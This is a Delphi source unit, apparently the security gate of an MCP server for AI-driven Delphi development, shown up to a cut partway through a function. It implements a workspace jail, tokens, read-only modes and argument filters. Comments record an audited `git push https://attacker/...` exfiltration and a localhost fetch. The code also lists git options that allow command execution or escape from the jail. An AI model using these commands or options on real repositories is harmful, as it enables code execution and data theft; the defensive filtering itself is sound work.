unit Lsp.Guard;

{ Access control: the security unit. Three layers, all configured in
  settings.ini next to the exe (env vars take precedence):

  1. Workspace jail - [Workspace] Roots / DELPHI_MCP_ROOTS. With roots
     configured, EVERY tool that touches the disk must stay inside them;
     paths are canonicalized so ..\ tricks and prefix cousins do not escape.
     No roots = unrestricted (local trusted mode).

  2. Credentials - [Security] AuthToken (full read-write) and ReadOnlyToken
     (read-only), plus AnonymousReadOnly=1 (no token = read-only). Enforced
     by the HTTP transport; this unit only reads and caches them.

  3. Read-only gate - ToolCallDenied is THE single entry gate, consulted by
     the tools dispatcher before ANY tool executes. The read/write
     classification of every tool lives HERE and nowhere else. }

interface

uses
  System.Classes,
  System.JSON,
  Lsp.Discovery; // TRadStudioInfo for IdeMacroVars

{ '' = allowed; otherwise the rejection message to return to the agent.
  This is the WRITE jail: only the configured workspace roots. }
function PathDenied(const APath: string): string;

{ Like PathDenied but for READING tools (read/search/list/fetch/LSP
  navigation): the jail is extended with the LIBRARY ZONE - the RAD Studio
  installation (RTL/VCL sources) and the IDE Library Search Path directories
  (installed components) - so an agent can follow a definition into
  System.Classes.pas or read a component's source. Read-only territory:
  writing tools keep using PathDenied and can never touch it. }
function ReadPathDenied(const APath: string): string;

{ The configured roots (empty array = unrestricted). }
function WorkspaceRoots: TArray<string>;

{ One-line human summary of the WRITE jail for the startup log (the single
  source of how the jail is described). AWarning is set when the state
  deserves a warning level: no jail at all (unrestricted) or fail-closed
  (Roots= had text but resolved to nothing). Paths are shown REAL here - the
  log goes to the operator's own stderr on the server, not to a client. }
function WorkspaceJailSummary(out AWarning: Boolean): string;

{ The READ-ONLY library zone (RAD Studio installations, IDE library search
  paths, GetIt catalog repositories). Readable by reading tools, never
  writable - exposed so delphi_workspace can tell the agent what it may read
  besides the roots (field round 4, R4-B). }
function LibraryReadRoots: TArray<string>;

{ The IDE's macro table for one installation ($(BDS), $(BDSLIB),
  $(BDSUSERDIR), $(BDSCOMMONDIR), $(BDSCatalogRepository)...), the same one
  the library zone is built from. ADest receives Name=Value pairs. }
procedure IdeMacroVars(const AInfo: TRadStudioInfo; ADest: TStrings);

{ The IDE's Library Search Path of ONE platform, every entry expanded to a
  real folder (macros resolved, no trailing delimiter), in registry order.
  Entries that still carry an unresolved macro or are not rooted are left
  out. What "delphi_components platform=X" shows and what the F2613 helper
  of delphi_build compares against. }
function IdePlatformLibraryPaths(const AVersion, APlatform: string): TArray<string>;

{ Credentials (env var first, then settings.ini [Security] next to the exe). }
function AuthToken: string;         // DELPHI_MCP_TOKEN         / AuthToken
function ReadOnlyToken: string;     // DELPHI_MCP_READONLY_TOKEN / ReadOnlyToken
function AnonymousReadOnly: Boolean;// DELPHI_MCP_ANON_READONLY  / AnonymousReadOnly=1
function BindIP: string;            // DELPHI_MCP_BIND_IP        / [Server] BindIP ('' = all)

{ The knowledge-vault root (Obsidian notes). Empty when unset.
  Env DELPHI_MCP_VAULT_PATH, else [Vault] Path. Canonicalized, no trailing
  delimiter. The vault_read/vault_search tools register only when
  VaultConfigured is true. }
function VaultPath: string;         // DELPHI_MCP_VAULT_PATH     / [Vault] Path
function VaultConfigured: Boolean;  // VaultPath set AND the directory exists

{ Whether APath is inside the knowledge vault. The vault belongs to the
  vault_* tools alone, so the code tools skip it in their walks even when it
  sits inside a workspace root - a listing that showed the notes would invite
  an agent to edit them behind the vault's back. }
function InVault(const APath: string): Boolean;

{ THE Windows name rule, in one place: a path segment ending in a dot or a
  space, or carrying an Alternate Data Stream (":"), is refused - Windows
  normalizes those away when opening, so what a check sees and what gets
  written are different files. Used by the workspace jail AND by the vault
  resolver: the same trick defeated both (delphi_textedit in an early round,
  the vault governance files in round 9), so the rule lives here once instead
  of being re-derived per toolset. '' = the name is fine. }
function PathAnomaly(const APath: string): string;

{ Whether the vault WRITE tools (vault_append/create/patch) are enabled:
  the vault is configured AND [Vault] ReadOnly is 0 (default 1 = read-only).
  Even when writable, the write tools are refused for a read-only credential
  at the gate (they are in the mutating list). }
function VaultWritable: Boolean;    // VaultConfigured AND [Vault] ReadOnly=0

{ Whether delphi_run may execute a compiled program ON THIS SERVER. OFF by
  design: this is a pure development/compile server - clients download the
  artifact and run it in their own environment (or a real target via PAServer
  / Android). Opt in with DELPHI_MCP_ALLOW_RUN=1 or [Security] AllowRun=1. }
function AllowRun: Boolean;         // DELPHI_MCP_ALLOW_RUN      / AllowRun=1

{ Whether delphi_build may run a project's OWN build scripts: a custom <Target>,
  a post-build step, Authenticode signing via <Exec>. SEPARATE from AllowRun on
  purpose - a TRUSTED project that signs or copies at build time can be enabled
  WITHOUT also turning on delphi_run (which would allow running arbitrary
  compiled programs). AllowRun implies this (full execution is a superset).
  Untrusted uploads with no opt-in still hit the hazard scanner. Opt in with
  DELPHI_MCP_ALLOW_BUILD_SCRIPTS=1 or [Security] AllowBuildScripts=1. }
function AllowBuildScripts: Boolean; // DELPHI_MCP_ALLOW_BUILD_SCRIPTS / AllowBuildScripts=1

{ Whether delphi_paserver may EXECUTE the deployed program on a PAServer
  target (command=remote-run). OFF by design and INDEPENDENT of AllowRun:
  running on the target is not running here, and the operator of this server
  is not necessarily the owner of that machine. Two locks in series, on
  purpose: this switch (server side) and the runner someone has to launch on
  the target. Opt in with DELPHI_MCP_ALLOW_REMOTE_RUN=1 or [Security]
  AllowRemoteRun=1. install-runner does NOT need it: copying the script
  executes nothing. }
function AllowRemoteRun: Boolean;   // DELPHI_MCP_ALLOW_REMOTE_RUN / AllowRemoteRun=1

{ Whether delphi_test may RUN a test project's binary on this server. OFF by
  default and separate from AllowRun on purpose: letting a test suite run is
  a narrower decision than letting any compiled program run (the binary comes
  from a project of the jail, is built here, and goes through the same
  low-integrity sandbox). AllowRun implies this one. Opt in with
  DELPHI_MCP_ALLOW_TESTS=1 or [Security] AllowTests=1. }
function AllowTests: Boolean;      // DELPHI_MCP_ALLOW_TESTS / AllowTests=1

{ Host names git may talk to when an agent writes an explicit URL, comma
  separated; '' (the default) means none - see GitRemoteDenied. }
function GitRemoteHosts: string;   // DELPHI_MCP_GIT_REMOTES / GitRemotes=

{ Host names delphi_paserver may DIAL when the caller names one by hand
  (test-connection host=...), comma separated. The hosts of the IDE's own
  connection profiles are always allowed and do not need listing. }
function RemoteProbeHosts: string; // DELPHI_MCP_REMOTE_HOSTS / RemoteHosts=

{ Whether the READ-ONLY library zone exists at all. Default True (reading the
  RTL and the installed components is what makes an agent competent here).
  [Security] LibraryZone=0 cuts it: reads are then confined to the workspace
  roots, exactly like writes. Field 2026-08-24: an agent noted that the zone
  GROWS by itself with every component or SDK installed, so the operator
  deserves a way to say no. }
function LibraryZoneEnabled: Boolean; // DELPHI_MCP_LIBRARY_ZONE=0 / LibraryZone=0

{ '' when APath (a .dproj) may be executed remotely, else a refusal. With
  [Security] RemoteRunProjects empty ANY project of the jail qualifies (the
  historical behaviour); with a semicolon list of project names or full
  paths, only those. Field 2026-08-24: an agent working on project A could
  run the deployed binary of project B. }
function RemoteRunProjectDenied(const APath: string): string;

{ Read-only mode. Two independent sources, OR-ed together:
  - process-wide: the whole server runs read-only (--readonly flag);
  - per-request: the HTTP transport marks the current worker thread according
    to which credential the request presented (full token = read-write,
    read-only token / anonymous read-only = read-only). }
procedure SetProcessReadOnly(AValue: Boolean);
procedure SetRequestReadOnly(AValue: Boolean);

{ Whether the CURRENT request/process is read-only (for delphi_workspace). }
function IsReadOnlyNow: Boolean;

{ THE single entry gate, consulted by the tools dispatcher before ANY tool
  executes. '' = allowed; otherwise the rejection message returned to the
  agent. In read-only mode every mutating tool is refused; delphi_git is
  mixed and resolved by its "command" argument (query commands pass).
  It also NORMALIZES the arguments in place: virtual drive units
  (srvd:\x -> D:\x) are expanded here, before any check or tool. }
function ToolCallDenied(const AToolName: string;
  const AArguments: TJSONObject): string;

{ Virtual drive units. The drive letters of this SERVER travel to the client
  as srvd:, srvc:, ... so a model never mistakes server paths for its own
  local disks (measured confusion in the field test). Round trip:
  - inbound: the entry gate expands srvX: in tool arguments (whole-value
    prefix match only, and never inside content-carrying parameters);
  - outbound: MaskDriveText rewrites every served drive prefix in a tool's
    textual result - one generic rule, so compiler/git/LSP output and even
    8.3 short forms (D:\PROYEC~1) are covered - EXCEPT for byte-fidelity
    tools (delphi_read / delphi_fetch), whose text is file content and must
    reach the client verbatim (an edit anchor built from masked text would
    not match the disk). }
function MaskDriveText(const AToolName, AText: string): string;

{ Inbound expansion of ONE value ('srvd:\x' -> 'D:\x'; anything else
  untouched, an unserved unit stays literal). Exposed for the /files download
  route, which receives its path as a query parameter, not as a tools/call
  argument - the same door, entered from HTTP. }
function ExpandDriveValue(const AValue: string): string;

{ The letter of a value shaped like a virtual unit ('srvd:', 'srvd:\x'),
  #0 otherwise. After ExpandDriveValue a non-#0 answer means an UNSERVED
  unit: refuse it by name, never let it near GetFullPath. }
function VirtualUnitLetter(const AValue: string): Char;

{ Expands $(NAME) macros with the IDE's environment table (AVars as
  NAME=VALUE, see Lsp.Discovery.IdeEnvironmentVars). Exposed for the search
  path vetting of delphi_config: a path with macros must resolve before the
  jail can judge it. }
function ExpandIdeMacros(const AText: string; AVars: TStrings): string;

{ '' when AText carries none of the shell metacharacters that would break a
  command line ( ; | & ` $ < > and newlines ), otherwise a refusal. For tool
  arguments that end up on a paclient/msbuild command line. }
function ShellArgDenied(const AText: string): string;

{ Whether a git argument names a remote the operator has NOT allowed.

  Measured 2026-08-25 by an auditor working only through MCP: `delphi_git
  command=fetch args="http://127.0.0.1:3131/mcp"` made the SERVER open a
  connection to that address, and `push https://attacker/... HEAD:main` would
  have walked the jail's contents out of the building. The agent's universe is
  supposed to end at the jail; an arbitrary outbound URL turns the server into
  a proxy into its own network (localhost, internal services, metadata
  endpoints) and into an exfiltration channel.

  So: an EXPLICIT url in a git argument must match [Security] GitRemotes, a
  comma-separated list of host names the operator wrote down. With that
  setting empty - the default - explicit URLs are refused outright. The remotes
  the OPERATOR configured in the repository keep working untouched (`push
  origin main` names a remote, not a URL): the decision about where this
  machine may talk to belongs to whoever owns the machine. }
function GitRemoteDenied(const AText: string): string;

implementation

uses
  System.SysUtils,
  System.StrUtils,
  System.IniFiles,
  System.IOUtils,
  System.Generics.Collections,
  MCPServer.Serializer, // NormalizeKey: ONE rule for argument names
  Lsp.Dproj,            // CanonicalPlatform: the platform whitelist already exists
  Lsp.Texts;

var
  GLoaded: Boolean = False;
  GRoots: TArray<string>;
  GRootsInvalid: Boolean = False; // Roots= had text but NO valid root: fail closed
  GProcessReadOnly: Boolean = False;
  GSecLoaded: Boolean = False;
  GAuthToken: string;
  GReadOnlyToken: string;
  GAnonymousReadOnly: Boolean = False;
  GAllowRun: Boolean = False; // delphi_run is OFF unless explicitly opted in
  GAllowRemoteRun: Boolean = False; // remote-run is OFF unless opted in
  GLibraryZone: Boolean = True;     // the read-only library zone, on by default
  GAllowTests: Boolean = False;     // running test suites is opt-in too
  GGitRemotes: string = '';         // hosts an explicit git URL may name
  GRemoteHosts: string = '';        // hosts a raw TCP probe may dial
  GRemoteProjects: TArray<string>;  // [Security] RemoteRunProjects, '' = any
  GAllowBuildScripts: Boolean = False; // build scripts OFF unless explicitly opted in
  GAdbDevices: TArray<string>;      // [Adb] AllowedDevices - the allowlist
  GAdbDevicesSet: Boolean = False;  // configured at all? absent = unrestricted

threadvar
  GRequestReadOnly: Boolean;

procedure SetProcessReadOnly(AValue: Boolean);
begin
  GProcessReadOnly := AValue;
end;

procedure SetRequestReadOnly(AValue: Boolean);
begin
  GRequestReadOnly := AValue;
end;

function IsReadOnlyNow: Boolean;
begin
  Result := GProcessReadOnly or GRequestReadOnly;
end;

procedure ParseAdbDevices(const ARaw: string);
var
  E: string;
begin
  if ARaw.Trim = '' then
    Exit;
  GAdbDevicesSet := True;
  for E in ARaw.Split([';']) do
    if E.Trim <> '' then
      GAdbDevices := GAdbDevices + [E.Trim];
end;

procedure LoadSecurity;
var
  IniPath: string;
  Ini: TIniFile;
begin
  if GSecLoaded then
    Exit;
  ParseAdbDevices(GetEnvironmentVariable('DELPHI_MCP_ADB_DEVICES'));
  GAuthToken := GetEnvironmentVariable('DELPHI_MCP_TOKEN');
  GReadOnlyToken := GetEnvironmentVariable('DELPHI_MCP_READONLY_TOKEN');
  GAnonymousReadOnly := GetEnvironmentVariable('DELPHI_MCP_ANON_READONLY') = '1';
  GAllowRun := GetEnvironmentVariable('DELPHI_MCP_ALLOW_RUN') = '1';
  GAllowRemoteRun := GetEnvironmentVariable('DELPHI_MCP_ALLOW_REMOTE_RUN') = '1';
  GLibraryZone := GetEnvironmentVariable('DELPHI_MCP_LIBRARY_ZONE') <> '0';
  GAllowTests := GetEnvironmentVariable('DELPHI_MCP_ALLOW_TESTS') = '1';
  GGitRemotes := GetEnvironmentVariable('DELPHI_MCP_GIT_REMOTES');
  GRemoteHosts := GetEnvironmentVariable('DELPHI_MCP_REMOTE_HOSTS');
  GAllowBuildScripts := GetEnvironmentVariable('DELPHI_MCP_ALLOW_BUILD_SCRIPTS') = '1';
  IniPath := TPath.Combine(TPath.GetDirectoryName(ParamStr(0)), 'settings.ini');
  if TFile.Exists(IniPath) then
  begin
    Ini := TIniFile.Create(IniPath);
    try
      if GAuthToken = '' then
        GAuthToken := Ini.ReadString('Security', 'AuthToken', '');
      if GReadOnlyToken = '' then
        GReadOnlyToken := Ini.ReadString('Security', 'ReadOnlyToken', '');
      if not GAnonymousReadOnly then
        GAnonymousReadOnly := Ini.ReadBool('Security', 'AnonymousReadOnly', False);
      if not GAllowRun then
        GAllowRun := Ini.ReadBool('Security', 'AllowRun', False);
      if not GAllowRemoteRun then
        GAllowRemoteRun := Ini.ReadBool('Security', 'AllowRemoteRun', False);
      if GLibraryZone then
        GLibraryZone := Ini.ReadBool('Security', 'LibraryZone', True);
      if not GAllowTests then
        GAllowTests := Ini.ReadBool('Security', 'AllowTests', False);
      if GGitRemotes = '' then
        GGitRemotes := Ini.ReadString('Security', 'GitRemotes', '');
      if GRemoteHosts = '' then
        GRemoteHosts := Ini.ReadString('Security', 'RemoteHosts', '');
      GRemoteProjects := Ini.ReadString('Security', 'RemoteRunProjects', '')
        .Split([';'], TStringSplitOptions.ExcludeEmpty);
      if not GAllowBuildScripts then
        GAllowBuildScripts := Ini.ReadBool('Security', 'AllowBuildScripts', False);
      if not GAdbDevicesSet then
        ParseAdbDevices(Ini.ReadString('Adb', 'AllowedDevices', ''));
    finally
      Ini.Free;
    end;
  end;
  GSecLoaded := True;
end;

function AuthToken: string;
begin
  LoadSecurity;
  Result := GAuthToken;
end;

function ReadOnlyToken: string;
begin
  LoadSecurity;
  Result := GReadOnlyToken;
end;

function AnonymousReadOnly: Boolean;
begin
  LoadSecurity;
  Result := GAnonymousReadOnly;
end;

function AllowRun: Boolean;
begin
  LoadSecurity;
  Result := GAllowRun;
end;

function AllowRemoteRun: Boolean;
begin
  LoadSecurity;
  // NOT implied by AllowRun: that one is about THIS machine.
  Result := GAllowRemoteRun;
end;

function LibraryZoneEnabled: Boolean;
begin
  LoadSecurity;
  Result := GLibraryZone;
end;

function AllowTests: Boolean;
begin
  LoadSecurity;
  Result := GAllowTests;
end;

function GitRemoteHosts: string;
begin
  LoadSecurity;
  Result := GGitRemotes.Trim;
end;

function RemoteProbeHosts: string;
begin
  LoadSecurity;
  Result := GRemoteHosts.Trim;
end;

function RemoteRunProjectDenied(const APath: string): string;
var
  E, Full, Name: string;
begin
  LoadSecurity;
  Result := '';
  if Length(GRemoteProjects) = 0 then
    Exit; // not configured: any project of the jail, as before
  try
    Full := TPath.GetFullPath(APath);
  except
    Full := APath;
  end;
  Name := TPath.GetFileNameWithoutExtension(Full);
  for E in GRemoteProjects do
    if (E.Trim <> '') and (SameText(E.Trim, Name) or SameText(E.Trim, Full)) then
      Exit;
  Result := Format(SR_REMOTERUN_PROJECT_DENIED_FMT,
    [Name, string.Join(', ', GRemoteProjects)]);
end;

function AllowBuildScripts: Boolean;
begin
  LoadSecurity;
  // AllowRun (running arbitrary programs) is a superset of running the project's
  // own build scripts, so it implies this without a second opt-in.
  Result := GAllowBuildScripts or GAllowRun;
end;

function BindIP: string;
var
  IniPath: string;
  Ini: TIniFile;
begin
  Result := GetEnvironmentVariable('DELPHI_MCP_BIND_IP');
  if Result <> '' then
    Exit;
  IniPath := TPath.Combine(TPath.GetDirectoryName(ParamStr(0)), 'settings.ini');
  if TFile.Exists(IniPath) then
  begin
    Ini := TIniFile.Create(IniPath);
    try
      Result := Ini.ReadString('Server', 'BindIP', '');
    finally
      Ini.Free;
    end;
  end;
end;

function VaultPath: string;
var
  IniPath: string;
  Ini: TIniFile;
begin
  Result := GetEnvironmentVariable('DELPHI_MCP_VAULT_PATH');
  if Result = '' then
  begin
    IniPath := TPath.Combine(TPath.GetDirectoryName(ParamStr(0)), 'settings.ini');
    if TFile.Exists(IniPath) then
    begin
      Ini := TIniFile.Create(IniPath);
      try
        Result := Ini.ReadString('Vault', 'Path', '');
      finally
        Ini.Free;
      end;
    end;
  end;
  Result := Result.Trim.Trim(['"']).Trim;
  if Result <> '' then
    try
      Result := ExcludeTrailingPathDelimiter(TPath.GetFullPath(Result));
    except
      Result := '';
    end;
end;

function VaultConfigured: Boolean;
begin
  var P := VaultPath;
  Result := (P <> '') and TDirectory.Exists(P);
end;

function InVault(const APath: string): Boolean;
var
  Vault: string;
begin
  Result := False;
  Vault := VaultPath;
  if Vault = '' then
    Exit;
  try
    Result := StartsText(IncludeTrailingPathDelimiter(Vault),
      IncludeTrailingPathDelimiter(TPath.GetFullPath(APath)));
  except
    Result := False;
  end;
end;

function VaultWritable: Boolean;
var
  IniPath: string;
  Ini: TIniFile;
  RO: Boolean;
begin
  Result := False;
  if not VaultConfigured then
    Exit;
  // Read-only by DEFAULT: writing to the knowledge vault must be opted into.
  // The env var wins in BOTH directions - it only overrode the ini when set to
  // "0", so a settings.ini with ReadOnly=0 could not be forced back to
  // read-only from the environment (which is how the test batteries ask for a
  // read-only vault).
  RO := True;
  var EnvRO := GetEnvironmentVariable('DELPHI_MCP_VAULT_READONLY');
  if EnvRO = '0' then
    RO := False
  else if EnvRO <> '' then
    RO := True
  else
  begin
    IniPath := TPath.Combine(TPath.GetDirectoryName(ParamStr(0)), 'settings.ini');
    if TFile.Exists(IniPath) then
    begin
      Ini := TIniFile.Create(IniPath);
      try
        RO := Ini.ReadBool('Vault', 'ReadOnly', True);
      finally
        Ini.Free;
      end;
    end;
  end;
  Result := not RO;
end;

procedure ExpandVirtualDrives(const AArguments: TJSONObject); forward;
function ServedDriveLetters: string; forward;
// VirtualUnitLetter is declared in the interface now (used by /files too).

function WriteDenied(const AWhat: string): string;
begin
  Result := Format(SR_READ_ONLY_FMT, [AWhat]);
end;

{ git "read" commands (diff/show/log...) still take FREEFORM args, and git has
  options that write files, read paths OUTSIDE the repository, or run a
  command - a jail/write escape usable even by a read-only client (measured:
  `diff --output=<abs path>` wrote a file anywhere on disk). Filtered HERE, at
  the single gate, so it applies to EVERY git call in BOTH access levels (the
  -C <repo> confinement does not stop an absolute --output). '' = clean. }
function GitArgDenied(const AArgs: string): string;
var
  Tok, T: string;
begin
  Result := '';
  for Tok in AArgs.Split([' ', #9], TStringSplitOptions.ExcludeEmpty) do
  begin
    T := Tok.ToLower;
    if T.StartsWith('--output') or          // writes a file (diff/show)
       T.StartsWith('--no-index') or        // reads arbitrary paths, any dir
       T.StartsWith('--upload-pack') or T.StartsWith('--receive-pack') or
       T.StartsWith('--exec') or            // runs a remote/local command
       T.StartsWith('--ext-diff') or T.StartsWith('--textconv') or // ext program
       T.StartsWith('--config') or T.StartsWith('-c') or  // arbitrary config -> RCE (--config is -c's long form on clone)
       T.StartsWith('--separate-git-dir') or T.StartsWith('--template') or // write/read outside the dest
       T.StartsWith('--git-dir') or T.StartsWith('--work-tree') or // redirect where git operates -> jail escape
       (T = '-o') or T.StartsWith('-o=') or T.StartsWith('-o/') or T.StartsWith('-o\') then
      Exit(Format(SR_GIT_OPTION_FMT, [Tok]));
  end;
end;

{ Host of a git URL, '' when the token is not a URL at all. Understands the
  two shapes git takes: scheme://[user@]host[:port]/... and the scp-like
  [user@]host:path. }
function GitUrlHost(const AToken: string): string;
var
  T: string;
  P: Integer;
begin
  Result := '';
  T := AToken.Trim.Trim(['"', '''']);
  P := Pos('://', T);
  if P > 0 then
    T := Copy(T, P + 3, MaxInt)
  else if (Pos('@', T) > 0) and (Pos(':', T) > Pos('@', T)) then
    T := Copy(T, Pos('@', T) + 1, MaxInt)
  else
    Exit; // not a URL: a branch, a path, an option
  P := Pos('@', T);
  if P > 0 then
    T := Copy(T, P + 1, MaxInt);
  // [::1]:3131 - the host is what the brackets hold, not the bracket
  if T.StartsWith('[') then
  begin
    P := Pos(']', T);
    if P > 1 then
      Exit(Copy(T, 2, P - 2).Trim.ToLower);
    Exit('[' + T); // malformed: keep it unrecognisable so it cannot match
  end;
  for P := 1 to Length(T) do
    if CharInSet(T[P], ['/', ':', '\']) then
    begin
      T := Copy(T, 1, P - 1);
      Break;
    end;
  Result := T.Trim.ToLower;
end;

function GitRemoteDenied(const AText: string): string;
var
  Tok, Host, Allowed: string;
  Ok: Boolean;
begin
  Result := '';
  for Tok in AText.Split([' ', #9], TStringSplitOptions.ExcludeEmpty) do
  begin
    Host := GitUrlHost(Tok);
    if Host = '' then
      Continue;
    Allowed := GitRemoteHosts;
    if Allowed = '' then
      Exit(Format(SR_GIT_REMOTE_OFF_FMT, [Host]));
    Ok := False;
    for var H in Allowed.Split([',', ';'], TStringSplitOptions.ExcludeEmpty) do
      if SameText(H.Trim, Host) then
      begin
        Ok := True;
        Break;
      end;
    if not Ok then
      Exit(Format(SR_GIT_REMOTE_HOST_FMT, [Host, Allowed]));
  end;
end;

function ShellArgDenied(const AText: string): string;
const
  Bad: array [0 .. 8] of string = (';', '|', '&', '`', '$', '<', '>', #13, #10);
var
  B: string;
begin
  Result := '';
  for B in Bad do
    if AText.Contains(B) then
      Exit(Format(SR_SHELL_META_FMT, [B]));
end;

{ Reads a tools/call argument the SAME WAY the RTTI binder resolves it
  (TMCPSerializer.NormalizeKey: case-insensitive AND ignoring '_').
  TJSONObject.TryGetValue is case-SENSITIVE, so the gate saw '' for an argument
  sent as "Args" or "com_mand" while the handler received its real value - a
  bypass of EVERY decision made here. The gate never calls TryGetValue on an
  argument again. Objects, arrays and null yield '' (TJSONAncestor.Value). }
function ArgStr(const AArguments: TJSONObject; const AName: string): string;
var
  P: TJSONPair;
  Want: string;
begin
  Result := '';
  if not Assigned(AArguments) then
    Exit;
  Want := TMCPSerializer.NormalizeKey(AName);
  for P in AArguments do
    if TMCPSerializer.NormalizeKey(P.JsonString.Value) = Want then
      Exit(P.JsonValue.Value);
end;

{ Two keys that normalize to the SAME parameter make the gate and the binder
  read different values: the binder probes the exact declared casing FIRST, so
  sending "args" with a harmless value AND "Args" with a dangerous one gets the
  first one vetted and the second one executed. Refusing the ambiguity removes
  the whole class instead of guessing which spelling wins. Runs BEFORE
  ExpandVirtualDrives, whose RemovePair also picks the first exact match.
  '' = clean. }
function DuplicateArgDenied(const AArguments: TJSONObject): string;
var
  I, J: Integer;
begin
  Result := '';
  if not Assigned(AArguments) then
    Exit;
  for I := 0 to AArguments.Count - 2 do
    for J := I + 1 to AArguments.Count - 1 do
      if TMCPSerializer.NormalizeKey(AArguments.Pairs[I].JsonString.Value) =
         TMCPSerializer.NormalizeKey(AArguments.Pairs[J].JsonString.Value) then
        Exit(Format(SR_ARG_DUPLICATE_FMT,
          [AArguments.Pairs[I].JsonString.Value]));
end;

{ delphi_build's platform/config/target reach a cmd.exe line UNQUOTED
  (rsvars.bat && msbuild ...), so a metacharacter there is arbitrary execution
  that sails past AllowRun, the jail, the low-integrity sandbox and the .dproj
  hazard scanner at once. platform reuses the whitelist that ALREADY exists for
  the .dproj XML sink (Lsp.Dproj.CanonicalPlatform) instead of a second, weaker
  charset test; target is a fixed trio; config is NOT a fixed list - a project
  may declare its own configurations (parity with the IDE), so it is bounded by
  a charset that admits no shell metacharacter. '' = clean. }
{ The identifier rule for a PAServer profile name: it becomes a file name in
  %APPDATA% and travels on command lines (paclient and msbuild /p:Profile=).
  ONE definition - PAServerArgDenied (name) and BuildArgDenied (profile) both
  read it, so the two mouths cannot drift. True = refuse. }
function BadProfileName(const V: string): Boolean;
var
  C: Char;
begin
  Result := Length(V) > 64;
  if not Result then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '_', '-']) then
        Exit(True);
end;

{ The identifier rule for a device address or serial (adb's ip:port or a
  serial like emulator-5554 / R58M...): what adb itself prints. ONE
  definition - AdbArgDenied (address/device) and BuildArgDenied (deviceid)
  both read it. True = refuse. }
function BadDeviceToken(const V: string): Boolean;
var
  C: Char;
begin
  Result := Length(V) > 64;
  if not Result then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '.', ':', '_', '-']) then
        Exit(True);
end;

{ The adb device allowlist ([Adb] AllowedDevices / DELPHI_MCP_ADB_DEVICES,
  semicolon list): when configured, the ONLY devices this server will
  address - outside it, nothing, at BOTH access levels (David's rule). An
  entry matches the target exactly, or matches its host part (the text
  before ':'), so '192.168.1.163' covers whatever port wifi debugging
  negotiates and a USB serial is listed as-is. Absent = unrestricted (a dev
  machine). }
function AdbTargetAllowed(const ATarget: string): Boolean;
var
  E, Host: string;
  P: Integer;
begin
  if not GAdbDevicesSet then
    Exit(True);
  Host := ATarget;
  P := Pos(':', ATarget);
  if P > 0 then
    Host := Copy(ATarget, 1, P - 1);
  for E in GAdbDevices do
    if SameText(E, ATarget) or SameText(E, Host) then
      Exit(True);
  Result := False;
end;

{ delphi_adb's address/device land on the adb command line. Same lesson as
  git/build/paserver: one vetting place for both access levels. The apk path
  is a filesystem argument vetted by the tool through ReadPathDenied. }
function AdbArgDenied(const AArguments: TJSONObject): string;
var
  V: string;
begin
  Result := '';
  LoadSecurity;
  V := ArgStr(AArguments, 'address').Trim;
  if V <> '' then
  begin
    if BadDeviceToken(V) then
      Exit(Format(SR_ADB_TARGET_FMT, [V]));
    if not AdbTargetAllowed(V) then
      Exit(Format(SR_ADB_ALLOWLIST_FMT, [V]));
  end;
  V := ArgStr(AArguments, 'device').Trim;
  if V <> '' then
  begin
    if BadDeviceToken(V) then
      Exit(Format(SR_ADB_TARGET_FMT, [V]));
    if not AdbTargetAllowed(V) then
      Exit(Format(SR_ADB_ALLOWLIST_FMT, [V]));
  end
  else if GAdbDevicesSet and MatchText(Trim(ArgStr(AArguments, 'command')),
    ['install', 'run', 'tap', 'key', 'logcat', 'screenshot']) then
    // With the allowlist active, an implicit target could be an UNLISTED
    // device that happens to be the only one attached: name it or nothing.
    Exit(SR_ADB_ALLOWLIST_DEVICE);
  // "app" is a package name reaching adb shell am start - same charset rule
  // (a package is letters/digits/dots/underscores), own message.
  V := ArgStr(AArguments, 'app').Trim;
  if (V <> '') and BadDeviceToken(V) then
    Exit(Format(SR_ADB_APP_FMT, [V]));
  // tap coordinates reach adb shell input - digits only. The key name is
  // whitelisted in the tool; here only its charset (letters).
  for var Coord in TArray<string>.Create('x', 'y') do
  begin
    V := ArgStr(AArguments, Coord).Trim;
    if V <> '' then
      for var C in V do
        if not CharInSet(C, ['0'..'9']) then
          Exit(Format(SR_ADB_XY_FMT, [V]));
  end;
  V := ArgStr(AArguments, 'key').Trim;
  if V <> '' then
    for var C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z']) then
        Exit(Format(SR_ADB_KEY_FMT, [V]));
end;

function BuildArgDenied(const AArguments: TJSONObject): string;
var
  V: string;
  C: Char;
begin
  Result := '';
  V := ArgStr(AArguments, 'platform').Trim;
  if (V <> '') and (CanonicalPlatform(V) = '') then
    Exit(Format(SR_BUILD_PLATFORM_FMT, [V]));
  V := ArgStr(AArguments, 'target').Trim;
  if (V <> '') and not MatchText(V, ['Build', 'Make', 'Clean', 'Deploy']) then
    Exit(Format(SR_BUILD_TARGET_FMT, [V]));
  // "profile" is a PAServer profile name reaching the msbuild command line
  // (/p:Profile=) - the same identifier rule as delphi_paserver's "name",
  // ONE definition for both mouths.
  V := ArgStr(AArguments, 'profile').Trim;
  if (V <> '') and BadProfileName(V) then
    Exit(Format(SR_PASERVER_NAME_FMT, [V]));
  // "deviceid" is an adb serial reaching msbuild (/p:DeviceId=) - the same
  // rule as delphi_adb's address/device.
  V := ArgStr(AArguments, 'deviceid').Trim;
  if (V <> '') and BadDeviceToken(V) then
    Exit(Format(SR_ADB_TARGET_FMT, [V]));
  V := ArgStr(AArguments, 'config');
  if V <> '' then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '_', '-', '.', ' ']) then
        Exit(Format(SR_BUILD_CONFIG_FMT, [V]));
end;

{ delphi_paserver's add-profile/test-connection compose a paclient.exe command
  line (direct CreateProcess, no shell - but a double quote would re-split the
  argument list) and the profile NAME doubles as a file name in %APPDATA%.
  Vetted here for BOTH access levels: one place, same lesson as the git and
  build argument filters. The platform whitelist is paclient's own
  (PACLIENT_PLATFORMS, Lsp.Dproj) - narrower than CanonicalPlatform. The
  password may not carry quotes or control characters; everything else is the
  PAServer's business. '' = clean. }
function PAServerArgDenied(const AArguments: TJSONObject): string;
var
  V: string;
  C: Char;
  N: Integer;
begin
  Result := '';
  V := ArgStr(AArguments, 'name').Trim;
  if (V <> '') and BadProfileName(V) then
    Exit(Format(SR_PASERVER_NAME_FMT, [V]));
  V := ArgStr(AArguments, 'host').Trim;
  if V <> '' then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '.', '-', ':']) then
        Exit(Format(SR_PASERVER_HOST_FMT, [V]));
